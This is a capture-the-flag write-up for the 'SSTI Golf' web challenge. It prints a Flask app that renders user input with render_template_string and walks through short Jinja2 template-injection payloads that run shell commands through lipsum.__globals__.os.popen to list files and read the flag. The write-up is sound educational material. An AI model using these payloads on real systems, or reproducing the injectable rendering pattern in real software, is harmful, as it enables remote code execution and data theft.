## Challenge Name: SSTI Golf
Category: Web
Points: 100
Solves: 223

Challenge Description:  
__Just in case you didn't get enough golf with the other challenge.  
Flag is in an arbitrarily named file, but in the same directory.__  

Link: http://sstigolf.chal.imaginaryctf.org

### Approach

The website displayed python flask source code.
```
#!/usr/bin/env python3

from flask import Flask, render_template_string, request, Response

app = Flask(__name__)

@app.route('/')
def index():
    return Response(open(__file__).read(), mimetype='text/plain')

@app.route('/ssti')
def ssti():
    query = request.args['query'] if 'query' in request.args else '...'
    if len(query) > 48:
        return "Too long!"
    return render_template_string(query)

app.run('0.0.0.0', 1337)
```  

It says that the site would render anything you put into the `query` parameter in the `ssti` directory.  
As the challenge name suggests, this strng rendering can cause Server Side Template Injection.  
You'll have to put the payload like this.  
`/ssti?query=<payload>`
I tested a bsic Flask/Jinja2 SSTI payload to see if they'll work.  
`{{config}}`  
It worked and returned me the config variables.  

![ssti](https://github.com/0xL30N3/Writeups/blob/main/Images/sstigolf.png)  
Next step is to try and write a payload that'll return me the flag.  
`{{lipsum.__globals__.os.popen('ls').read()}}`  
You can also use `url_for` instead of `lipsum` but lipsum is shorter and we have a word limit of 48.  
`os.popen()` runs system commands in python.  
We can see an interesting file named `truly_an_arbitrarily_named_file` if we ran the payload.  
We will now try to read the file.  
You can use `cat truly_an_arbitrarily_named_file` but the word limit will be exceeded.  
So, you can either delcare `truly_an_arbitrarily_named_file` as a config variable  
Or you can use `cat t*`.  
I chose the latter because it's less work and shorter.
So, our final payload is gonna be :  
`{{lipsum.__globals__.os.popen('cat t*').read()}}`  

__Flag:  `ictf{F!1+3r5s!?}`__
